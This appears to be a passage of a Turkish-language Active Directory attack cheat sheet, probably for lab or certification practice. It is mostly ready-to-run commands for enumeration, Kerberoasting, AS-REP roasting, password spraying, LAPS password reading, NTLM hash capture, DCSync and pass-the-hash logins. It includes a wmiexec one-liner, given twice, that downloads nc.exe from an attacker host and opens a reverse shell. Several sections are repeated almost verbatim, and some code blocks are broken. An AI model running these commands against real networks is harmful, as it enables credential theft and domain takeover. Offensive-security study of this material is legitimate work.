Get-NetGPO | ForEach-Object {Get-ObjectAcl -ResolveGUIDs -Name $_.name} | Where-Object {$_.ActiveDirectoryRights -match 'WriteProperty'}
```

### DCSync iznine sahip kullanıcıları bul:
```powershell
Get-ObjectACL -DistinguishedName "dc= steins , dc=local " -ResolveGUIDs | ? {($_.ObjectType -match 'replication-get') or $_.ActiveDirectoryRights -match 'GenericAll'}
```

### AdminSDHolder ACL'lerini incele:
```powershell
Get-ObjectAcl -ADSprefix 'CN=AdminSDHolder,CN=System' -ResolveGUIDs | ?{$_.IdentityReference -match 'SamAccountName1'}
```

---

## Yerel Yönetici Yetkisi Enumérasyonu

### PowerView: Yerel yönetici üyelerini al:
```powershell
Get-NetLocalGroup -ComputerName computer_name
```

### API çağrılarını kullanarak yerel yönetici üyelerini al:
```powershell
Get-NetLocalGroup -ComputerName computer_name -API
```

### Yerel yönetici üyelerini özyinelemeli olarak al:
```powershell
Get-NetLocalGroup -ComputerName computer_name -Recurse
```

---

## Orman Enumérasyonu

### Orman detaylarını ve içindeki alan adlarını al:
```powershell
Get-NetForest
```

### Mevcut ormandaki tüm alan adlarını listele:
```powershell
Get-NetForestDomain
```

### Etki alanı denetleyicilerini listele:
```powershell
Get-NetDomain
```

### PDC Emulator FSMO rolünü tutan etki alanı denetleyicisini bul:
```powershell
Get-ADForest | Select-Object -ExpandProperty RootDomain | Get-ADDomain | Select-Object -Property PDCEmulator
```
```powershell
Get-NetDomain -Properties * | Select DomainControllers,PdcRoleOwner
```

### Orman içindeki tüm alan adı güvenlerini haritala:
```powershell
Invoke-MapDomainTrust
Invoke-MapDomainTrust -LDAP
Invoke-MapDomainTrust | Export-Csv -NoTypeInformation trusts.csv
```
## Yabancı Kullanıcıları ve Grupları Bulma

### Komutlar:

```powershell
# Mevcut domaindeki gruplara bağlı yabancı kullanıcıları bulmak için:
Find-ForeignUser -Domain steins.local
Find-ForeignGroup -Domain steins.local

# Domain trust bilgilerini görmek için:
Get-NetDomainTrust

# Bağlantıları belirlemek için:
get-ADObject -filter {ObjectClass -eq "Contact"} -Prop *
```

---

## Forest ve Trust Haritalama

### Komutlar:

```powershell
# Forest'teki tüm domainleri listelemek:
Get-NetForestDomain

# Tüm ulaşılabilir domain trustlarını haritalamak:
Invoke-MapDomainTrust

# LDAP sorguları ile trust haritalamak:
Invoke-MapDomainTrust -LDAP

# Trust haritalarını CSV formatında dışa aktarmak:
Invoke-MapDomainTrust | Export-Csv -NoTypeInformation trusts.csv

# Domain trust bilgilerini enumerate etmek:
nltest /domain_trusts
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
```

---

## PowerView Komutları

### Kullanımlar:

```powershell
# Tüm domain trust bilgilerini görüntülemek:
Invoke-MapDomainTrust
Get-NetDomainTrust
Get-NetForestTrust
```

---

## Kullanıcı Arama ve SMB Kapatılı Olma Durumu

### Komutlar:

```powershell
# Lokal admin erişimli makineleri bulmak için:
Find-LocalAdminAccess -Verbose

# SMB veya RPC kapalıysa alternatif:
Find-WMILocalAdminAccess.ps1

# Domaindeki tüm bilgisayarları listelemek:
Get-NetComputer

# Lokal admin erişim kontrolü:
Find-WMILocalAdminAccess -ComputerFile ./computers.txt -Verbose
Find-WMILocalAdminAccess -ComputerName starkt
```

---

## DCSync Haklarını Kontrol Etme

### Komutlar:

```powershell
# DCSync hakları olan kullanıcıları bulmak:
Get-ObjectACL -DistinguishedName "dc=steins,dc=local" -ResolveGUIDs | ? { ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') }

# AdminSDHolder ACL'lerini görüntülemek:
Get-ObjectAcl -ADSprefix 'CN=AdminSDHolder,CN=System' -ResolveGUIDs | ?{$_.IdentityReference -match 'SamAccountName1'}
```

---

## PowerView ile Admin Tespiti

### Komutlar:

```powershell
# Tüm domaindeki lokal adminleri bulmak:
Invoke-EnumerateLocalAdmin -Verbose

# AdminCount özelliğine sahip admin hesaplarını bulmak:
Get-NetUser -AdminCount | select name, whencreated, pwdlastset, lastlogon

# Domain Admins grubuna ait admin hesaplarını bulmak:
Get-NetGroupMember -GroupName 'Domain Admins' -FullData
```

---

## Domain Admin Oturumlarını Bulma

### Komutlar:

```powershell
# Domain Adminlerin oturum açtığı bilgisayarları bulmak:
Invoke-UserHunter -Verbose

# Belirli bir grubun oturumlarını bulmak:
Invoke-UserHunter -GroupName "RDPUsers"

# Yüksek değerli hedeflerdeki oturumları bulmak:
Invoke-UserHunter -Stealth -ShowAll
```

---

## Kullanıcı ve Grup Bilgisi

### Komutlar:

```powershell
# Domain Adminlerin oturum açtığı bilgisayarlar:
Invoke-UserHunter -Verbose

# GPO ile bilgisayar adminlerini bulmak:
Find-GPOComputerAdmin -ComputerName computer_name
```

---

## Kerberoasting

### Süreç:

1. SPN'ye sahip kullanıcıları bul:

   ```powershell
   Get-NetUser -SPN
   Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
   ```

2. TGS Bileti Al:

   ```powershell
   GetUserSPNs.py -request -dc-ip 10.10.10.10 Steins.local/mark
   ```

3. Hashı Kır:

   ```bash
   hashcat -m 13100 -a 0 ticket.hashcat rockyou.txt --force
   ```

---

## AS-REP Roasting

### Süreç:

1. PreAuthNotRequired özelliğine sahip kullanıcıları bul:

   ```powershell
   Get-DomainUser -PreauthNotRequired
   ```

2. AS-REP Al:

   ```powershell
   Invoke-ASREPRoast -Verbose
   ```

3. Hashı Kır:

   ```bash
   hashcat -m 18200 hash rockyou.txt --force
   ```

---

## WMIexec ile Komut Çalıştırma

```bash
proxychains wmiexec.py domain/username:'password'@TARGET_ip "powershell.exe Invoke-WebRequest -Uri 'http://KALI_ip/nc.exe' -OutFile 'C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe'; cmd.exe /c C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -e cmd.exe KALI_IP 9001"
```
### Alanında Bulunan Kullanıcıların ve Grupların Bulunması

#### Diğer bir trust içindeki gruplarda bulunan kullanıcıları bul:
```powershell
Find-ForeignUser
Find-ForeignGroup -Domain steins.local
```

#### Domain Trustlarını Görüntüle:
```powershell
Get-NetDomainTrust
```

#### Partner Organizasyonları Tanımlama (Powershell AD Modülü Kullanılarak):
```powershell
get-ADObject -filter {ObjectClass -eq "Contact"} -Prop *
```

#### Mevcut Forest içindeki tüm domainleri listele:
```powershell
Get-NetForestDomain
```

#### Tüm ulaşılabilir domain trustlarını haritalama:
```powershell
Invoke-MapDomainTrust
```

#### LDAP sorgularını kullanarak domain trustlarını haritalama:
```powershell
Invoke-MapDomainTrust -LDAP
```

#### Domain trust haritalarını dışa aktarma:
```powershell
Invoke-MapDomainTrust | Export-Csv -NoTypeInformation trusts.csv
```

### Domain Trustlarını Listeleme

#### NLTEST kullanarak:
```powershell
nltest /domain_trusts
```

#### .NET ile:
```powershell
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
```

#### PowerView Kullanarak:
```powershell
Invoke-MapDomainTrust
Get-NetDomainTrust
Get-NetForestTrust
```

### Kullanıcı Avı (User Hunting) - Düşük Gürültü Yaklaşımı

Eğer SMB devre dışıysa aşağıdaki yöntemleri deneyebilirsiniz:
- [get-wmiadmin.txt scripti](https://jdhitsolutions.com/blog/wp-content/uploads/2011/07/get-wmiadmin.txt) ındirin ve import edin.

#### Mevcut kullanıcı için local admin erişimi olan makineleri bulma:
```powershell
Find-LocalAdminAccess -Verbose
```

#### SMB/RPC kapalıysa WMI kullanarak local admin erişimi bulma:
```powershell
Find-WMILocalAdminAccess.ps1
```

#### Domain içindeki bilgisayar listesini alma:
```powershell
Get-NetComputer
```

#### Belirli bir bilgisayar listesinde local admin erişimi bulma:
```powershell
Find-WMILocalAdminAccess -ComputerFile ./computers.txt -Verbose
```

#### Tek bir bilgisayarda local admin erişimi bulma:
```powershell
Find-WMILocalAdminAccess -ComputerName starkt
```

### DCSync Hakları Olan Kullanıcıları Bulma

#### Kullanıcıları Listeleme:
```powershell
Get-ObjectACL -DistinguishedName "dc=steins,dc=local" -ResolveGUIDs | ? {($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
```

#### AdminSDHolder ACL'lerini Görüntüleme:
```powershell
Get-ObjectAcl -ADSprefix 'CN=AdminSDHolder,CN=System' -ResolveGUIDs | ?{$_.IdentityReference -match 'SamAccountName1'}
```

### Local Adminleri Tespit Etme

#### Tüm makinelerde local adminleri bulma:
```powershell
Invoke-EnumerateLocalAdmin -Verbose
```

#### AdminCount ile admin hesaplarını bulma:
```powershell
Get-NetUser -AdminCount | select name,whencreated,pwdlastset,lastlogon
```

#### Non-admin kullanıcıların admin hesaplarını bulma:
```powershell
Get-NetGroupMember -GroupName 'Domain Admins' -FullData | %{ $a=$_.displayname.split(' ')[0..1] -join ' '; Get-NetUser -Filter "(displayname=$a)" } | Select Object -Property displayname,samaccountname
```

### Domain Adminlerin Bağlı Olduğu Bilgisayarları Bulma

#### Tüm makinelerde oturumları bulma:
```powershell
Invoke-UserHunter -Verbose
```

#### Belirli bir gruptaki oturumları bulma:
```powershell
Invoke-UserHunter -GroupName "RDPUsers"
```

#### Yüksek değere sahip hedeflerde oturumları kontrol etme:
```powershell
Invoke-UserHunter -Stealth -ShowAll
```

### GPO Kullanarak Bir Bilgisayarın Adminlerini Bulma

```powershell
Find-GPOComputerAdmin -ComputerName computer_name
```

### Yüksek Yetkili Kullanıcıları Bulma

#### Linked Domain Admin hesaplarını bulma:
```powershell
Get-DomainGroupMember 'Domain Admins' | %{Get-DomainUser $_.membername -LDAPFilter '(displayname=*)'} | %{$a=$_.displayname.split(' ')[0..1] -join ' '; Get-DomainUser -LDAPFilter "(displayname=$a)" -Properties displayname,samaccountname}
```

#### Admin yetkilerine sahip normal kullanıcıları bulma:
```powershell
Get-NetGroup "admins" | Get-NetGroupMember -Recurse | ?{Get-NetUser $_.MemberName -filter '(mail=*)'}
```

### ACL Tabanlı Analiz ve Keşif

#### ACLight Kullanarak:
```powershell
Import-Module .\ACLight2.psm1
Start-ACLsAnalysis
```

#### Invoke-ACLPwn Kullanarak:
```powershell
./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'testuser' -Domain 'xenoflux.local' -Password 'Welcome01!'
```

### SMB Signing Kapalıysa Credentials Yakalama

#### Responder Kullanarak:
```bash
responder -I tun0 -F --lm -d -w -i KALI_IP
```

#### Hashcat ile NTLMv2 Hash Kırma:
```bash
hashcat -m 5600 hash ~/Downloads/rockyou.txt --force -r /usr/share/hashcat/rules/d3ad0ne.rule
```

### Diğer Kullanıcıların Adına Komut Çalıştırma

#### PowerShell Kullanarak:
```powershell
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('Domain\UserName', $SecPassword)
Get-aduser -Identity user1 -Credential $Cred
```
### Kerberoasting

#### TGS Biletini Diske Kaydetme ve Brute Force İşlemi

DC, hizmet hesabını ServicePrincipalName (SPN) ile tanımlar ancak hizmet hesaplarının şifreleri genellikle zor kırılır.

### SPN Ayarlanmış Kullanıcıları Bulma

#### PowerShell Modülü Kullanarak:
```powershell
Import-Module .\GetUserSPNs.ps1
```

#### Active Directory Modülü Kullanarak:
```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

#### PowerView Kullanarak:
```powershell
Get-NetUser -SPN
```

### TGS Biletini Alma

#### GetUserSPNs.py Kullanarak:
```bash
sudo GetUserSPNs.py -request -dc-ip 10.10.10.10 Steins.local/mark
```

#### Active Directory Modülü Kullanarak:
```powershell
powershell.exe -exec bypass -c "Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'SPNNAME/hostname.steins.LOCAL:1433' "
```

#### PowerView Kullanarak:
```powershell
Request-SPNTicket
```

#### Invoke-Kerberoast Kullanarak:
```powershell
Import-Module .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat Hashcat
```

#### Rubeus Kullanarak:
```powershell
.\Rubeus.exe kerberoast /domain:steins.local /user:username /format:hashcat /outfile:hash.txt
```

#### Mimikatz Kullanarak Bellekten Diske Aktarma:
```powershell
Invoke-Mimikatz -Command '"Kerberos::list /export"'
```

### Hash Kırma

#### Hashcat Kullanarak:
```bash
hashcat -m 13100 -a 0 ticket.hashcat /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/T0XlC-insert_space_and_special_0_F.rule --force
```
veya
```bash
hashcat -a 0 -m 13100 ticket.hashcat /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule --force
```
veya
```bash
hashcat -a 0 -m 13100 hash ~/Downloads/Tools/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule --force
```
veya
```bash
hashcat -m 13100 krb5t_hash rockyou.txt --force
```
veya
```bash
python tgscrack.py wordlist.txt hash.txt
```

### Hedefli Kerberoasting - AS-REP Roasting

#### Adımları:

**1. PreAuth Gerekmeyen Kullanıcıları Bulma**

#### PowerView Kullanarak:
```powershell
Get-DomainUser -PreauthNotRequired -Verbose
```

#### AD Modülü Kullanarak:
```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuths
```

#### LDAP Sorgusu Kullanarak:
```bash
(&(UserAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer)))
```

**2. Suistimal Edilebilecek Kullanıcıları Bulma**

#### PowerView Kullanarak:
```powershell
Invoke-ACLScanner -ResolveGUIds | {$_.IdentityReferenceName -match "RDPUsers"}
```

#### GenericWrite Haklarını Bulma:
```powershell
Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericWrite')}
```

#### GenericAll Haklarını Bulma:
```powershell
Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericAll')}
```

#### SID İle Eşleşenleri Kontrol Etme:
```powershell
Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericWrite') -and ($_.SecurityIdentifier -match 'S-1-5-21-1087654965-336889418-4984984984-1501')}
```

**3. Pre-Auth Devre Dışı Bırakma**

#### PowerView Kullanarak:
```powershell
Set-DomainObject -Identity USER_NAME -XOR @{useraccountcontrol=4194304} -Verbose
```

#### AD Modülü Kullanarak:
```powershell
Set-ADAccountControl -Identity Administrator -doesnotrequirepreauth $true
```

**4. Değişiklikleri Doğrulama**

#### PreAuth Gerekmeyen Kullanıcıları Bulma:
```powershell
Get-DomainUser -PreAuthNotRequired -Verbose
```

**5. AS-REP Alma**

#### ASREPRoast.ps1 Kullanarak:
```powershell
Get-ASREPhash -Username USER_NAME -Verbose
Invoke-ASREPRoast -Verbose
```

#### Rubeus Kullanarak:
```powershell
Rubeus.exe asreproast /user:UserName
Rubeus.exe asreproast /user:Administrator /format:hashcat /outfile:hash.txt
```

#### GetNPUsers.py Kullanarak:
```bash
GetNPUsers.py STEINS-DC.LOCAL/ -usersfile users.txt -outputfile hashes.txt -dc-ip 10.10.10.10
```

**6. Hash Kırma**

#### John the Ripper Kullanarak:
```bash
john krbhash --wordlist=wordlist.txt
```

#### Hashcat Kullanarak:
```bash
hashcat -m 18200 hash -a 3 rockyou.txt
hashcat -m 18200 hash rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule --force
### Hedefli Kerberoasting - SPN Ayarlama

#### Adım 1: SPN Ayarlanmamış Kullanıcıları Bulma

##### PowerView Kullanarak GenericAll İzinlerine Sahip Kullanıcıları Bulma:
```powershell
Invoke-ACLScanner -ResolveGUIds | {$_.IdentityReferenceName -match "RDPUsers"}
```

##### AD Modülü Kullanarak SPN Olmayan Kullanıcıyı Bulma:
```powershell
Get-ADUser -Identity USER_Name -Properties ServicePrincipalName | Select ServicePrincipalName
```

#### Adım 2: Kullanıcı İçin SPN Ayarlama (Domain İçinde Benzersiz Olmalıdır)

##### AD Modülü Kullanarak:
```powershell
Set-ADUser -Identity USER_NAME -ServicePrincipalNames @{Add='DomainName/SomeUniqueName'} -Server steins.local
```

##### PowerView Kullanarak:
```powershell
Set-DomainObject -Identity USER_NAME -Set @{serviceprincialName = 'DomainName/SomeUniqueName'}
```

##### Veya:
```powershell
Set-ADObject -SamAccountName <TARGET_Username> -PropertyName serviceprincipalname -PropertyVale 'domainName/SomeUniqueName'
```

##### addspn.py Kullanarak:
```bash
python addspn.py steinsdc.local -u <USER_WITH_WRITE_PRIVS> --spn "DomainName/SomeUniqueName" --target TARGET_USERNAME
```

#### Adım 3: SPN'nin Kullanıcıya Ayarlandığını Doğrulama

##### AD Modülü Kullanarak:
```powershell
Get-ADUser -Identity USER_Name -Properties ServicePrincipalName | Select ServicePrincipalName
```

#### Adım 4: TGS Bileti İsteme

##### AD Modülü Kullanarak:
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosReceiverSecurityToken -ArgumentList 'DomainName/SomeUniqueName'
```

##### PowerView Kullanarak:
```powershell
Request-SPNTicket
Get-DomainUser Target_Username | Get-DomainSPNTicket
```

##### Invoke-Kerberoast Kullanarak:
```powershell
Import-Module .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat Hashcat
```

##### Rubeus Kullanarak:
```powershell
.\Rubeus.exe kerberoast /domain:steins.local /user:username /format:hashcat /outfile:hash.txt
```

##### GetUserSPNs.py Kullanarak:
```bash
GetUserSPNs.py domain/username -request
```

##### Invoke-Kerberoast.ps1 Kullanarak:
```powershell
Invoke-Kerberoast -Identity Target_username
```

#### Adım 5: TGS Biletini Kontrol Etme

##### Bileti Kontrol Etme:
```bash
klist
```

##### Bileti Dışa Aktarma:
```powershell
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

#### Adım 6: TGS Hashini Kırma

##### Hashcat Kullanarak:
```bash
hashcat -m 13100 -a 0 ticket.hashcat /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/T0XlC-insert_space_and_special_0_F.rule --force
```
veya:
```bash
hashcat -a 0 -m 13100 ticket.hashcat /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule --force
```
veya:
```bash
hashcat -a 0 -m 13100 hash ~/Downloads/Tools/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule --force
```
veya:
```bash
hashcat -m 13100 krb5t_hash rockyou.txt --force
```

#### Cleanup İşlemleri

##### AD Modülü Kullanarak:
```powershell
Set-ADUser -Identity USER_NAME -ServicePrincipalNames @{Remove='DomainName/SomeUniqueName'} -Server steins.local
```

##### addspn.py Kullanarak:
```bash
python addspn.py steinsdc.local -u <USER_WITH_WRITE_PRIVS> --spn "DomainName/SomeUniqueName" --target TARGET_USERNAME --remove
```

##### PowerView Kullanarak:
```powershell
Set-DomainObject -Identity USER_NAME -Clear serviceprincipalname
```

##### AD Object Kullanarak:
```powershell
Set-ADObject -SamAccountName -PropertyName serviceprincipalname -ClearValue
```

#### Tek Komut ile İşlem

##### PowerView Kullanarak:
```powershell
Set-DomainObject -Identity USER_NAME -Set @{serviceprincialName = 'DomainName/SomeUniqueName'}
$User = Get-DomainUser USER_NAME
$User | Get-DomainSPNTicket | fl
$User | Select serviceprincipalname
Set-DomainObject -Identity USER_NAME -Clear serviceprincipalname
```

### Domain Kullanıcılarını Brute Force ile Bulma

#### Kerbrute Kullanarak:
```bash
kerbrute userenum --dc 10.10.10.10 -d steins.local users.txt
```

##### Kerbrute İndirerek:
```bash
kerbrute userenum --domain htb.local /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.10
```

#### Rubeus Kullanarak:
```powershell
Rubeus.exe /users:users.txt /passwords:wordlist.txt /domain:steins.local /outfile:Output.txt
```

#### CrackMapExec Kullanarak:
```bash
crackmapexec <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords
```

##### Password Spraying (Brute Force Olmadan):
```bash
crackmapexec <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes --no-bruteforce
```

### ASREP Roasting - Linux Üzerinden

#### Pre-Auth Olmayan Kullanıcılardan Hash Almak:
```bash
sudo GetNPUsers.py STEINS-DC.LOCAL/ -usersfile users.txt -outputfile hashes.txt -dc-ip 10.10.10.10
sudo john hash --format=krb5asrep --wordlist=rockyou.txt
```

#### ASREP Roasting - Kimlik Doğrulama ile:
```bash
python3 GetNPUsers.py steins.local/user:"password!" -dc-ip 10.10.10.10 -request
```

#### Zamanı DC ile Eşitleme:

##### Proxychains ve net time Kullanarak:
```bash
proxychains net time -S 10.10.10.10
```

##### Curl ile:
```bash
proxychains curl DC_IP:5985 -v
```

##### Linux Sisteminde Tarih Ayarı:
```bash
sudo date -s "Thu Dec 24 10.10.10.10"
```
veya:
```bash
sudo apt-get install ntpdate
sudo ntpdate
```

#### Password Spraying:

##### PowerView Kullanarak:
```powershell
Get-DomainUser | select samaccountname > users.txt
Import-Module DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -UserList users.txt -Password 'P@$$W0rd!' -OutFile sprayed-creds.txt
```
veya:
```bash
proxychains crackmapexec smb 10.10.10.10 -d steins.local -u users.txt -p 'p@$$w0rd1' --continue-on-success
### LAPS Delegasyonu

#### Belirli Bir Bilgisayar İçin LAPS Şifresine Okuma Erişimi Olan Kullanıcıları/Grupları Bulma
```powershell
Get-NetComputer -ComputerName 'computer_name' -FullData | Select-Object -ExpandProperty distinguishedname | ForEach-Object { $_.substring($_.indexof('OU')) } | ForEach-Object { Get-ObjectAcl -ResolveGUIDs -DistinguishedName $_ } | Where-Object { ($_.ObjectType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty') } | ForEach-Object { Convert-NameToSid $_.IdentityReference } | Select-Object -ExpandProperty SID | Get-ADObject
```

#### LAPS Şifresini Okuma Erişimi Olan Tüm OU'lar İçin ACL'leri Bulma
```powershell
Get-NetOU -FullData | Get-ObjectAcl -ResolveGUIDs | Where-Object { ($_.ObjectType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty') } | ForEach-Object { $_ | Add-Member NoteProperty 'IdentitySID' (Convert-NameToSid $_.IdentityReference).SID; $_ }
```

#### LAPS Şifresine Erişimi Olan Kullanıcıları Listeleme
```powershell
$LAPSAdmins = Get-ADGroup 'GroupName' | Get-ADGroupMember -Recursive
$LAPSAdmins += Get-ADGroup 'AnotherGroupName' | Get-ADGroupMember -Recursive
$LAPSAdmins | Select Name, distinguishedName | Sort-Object Name -Unique | Format-Table -AutoSize
```

### LAPS Keşfi

#### Yerel Makinede LAPS Kurulu Olup Olmadığını Bulma
```powershell
Get-ChildItem 'c:\program files\LAPS\CSE\Admpwd.dll'
Get-FileHash 'c:\program files\LAPS\CSE\Admpwd.dll'
Test-Path 'HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\NT\CurrentVersion\Winlogon\GPExtensions'
```

#### LAPS Niteliklerinin Var Olduğunu Kontrol Etme
```powershell
Get-AdObject 'CN=ms-mcs-admpwd,CN=Schema,CN=Configuration,DC=ELS,DC=LOCAL'
```

#### LAPS Adı İçeren GPO'ları Bulma
```powershell
Get-DomainGPO -Identity 'LAPS'
```

#### LAPS GPO'sunun Uygulandığı Tüm Bilgisayarları Bulma
```powershell
Get-DomainOU -GPLink "<GUID_NAME>" -Properties distinguishedname
Get-DomainComputer -SearchBase "LDAP://" -Properties distinguishedname
```

#### LAPS Şifresine Erişimi Olan Kullanıcıları Listeleme (LAPS PowerShell Modülü Kullanılarak)
```powershell
Find-AdmPwdExtendedRights -Identity workstations | %{$_.ExtendedRightHolders}
```

#### LAPS Şifresini Alma (LAPS PowerShell Modülü Kullanılarak)
```powershell
Get-AdmPwdPassword -ComputerName | fl
```

#### LAPS Süresini Değiştirme
```powershell
Set-DomainObject -Identity <TARGET_COMPUTER> -Set @{‘ms-Mcs-AdmPwdExpirationTime’=‘<NEW_VALUE>’} -Verbose
```

### Şifrelerle Shell Açma

#### Port 5985 Açıkken WinRM ile Giriş
```bash
sudo evil-winrm -u USERNAME -p PASSWORD -i 10.10.10.10
```
veya
```bash
evil-winrm -u username -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.10
```
veya
```bash
psexec.py USERNAME@10.10.10.10
```
veya
```bash
sudo secretsdump.py USERNAME@10.10.10.10
```
veya
```bash
./mimikatz.exe "lsadump::dcsync /user:Administrator" "exit"
```
veya
```bash
evil-winrm -i 10.10.10.10 -u administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```
veya
```bash
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 steins.local/administrator@10.10.10.10
```
veya
```bash
.\SharpDPAPI.exe machinecredentials
```
veya
```bash
psexec.py Administrator@10.10.10.10 -hashes LMHASH:NTHASH
```

### Kimlik Bilgilerini Taklit Etme

#### STA Modunda Çalışıyorken Başka Bir Kimliği Taklit Etme
```powershell
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred
... action
Invoke-RevertToSelf
```

### AD Recycle Bin Grubu Enumerasyonu

#### Silinmiş Nesneleri Bulma
```powershell
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
```

#### Kullanıcı Şifrelerini Kontrol Etme
```powershell
Get-ADObject -filter { SAMAccountName -eq "UserName" } -includeDeletedObjects -property *
```

### WMIExec ile RCE

#### Komut Çalıştırma
```bash
proxychains wmiexec.py -debug -nooutput domain/username:'password'@TARGET_ip "powershell.exe Invoke-WebRequest -Uri 'http://KALI_ip/nc.exe' -OutFile 'C:\Windows\System32\spool\drivers\color\nc.exe'; cmd.exe /c C:\Windows\System32\spool\drivers\color\nc.exe -e cmd.exe KALI_IP 9001"
```

### Linux'ta Kerberos Ticketing

#### TGT Oluşturma
```bash
kinit username@steins.local
```

#### Kerberos ile Giriş Yapma
```bash
KRB5CCNAME=/tmp/krb5cc_0 python wmiexec.py -k -no-pass steins.local/username@target
```

#### NTLM Devre Dışı Olduğunda Hash Kullanma
```bash
ktutil -k kerbticket_path add -p username@steins.local -e arcfour-hmac-md5 -w 49623ccc820122ab49b3f0f571b77186 --hex -V 5
kinit -t kerbticket_path username@steins.local
```

#### Kerberos Kimlik Doğrulama ile WMIExec Kullanma
```bash
KRB5CCNAME=/tmp/krb5cc_0 python wmiexec.py -k -no-pass steins.local/username@target
```

#### Kirbi'yi CCache'e Dönüştürme
```bash
ticket_converter.py Administrator.kirbi Administrator.ccache


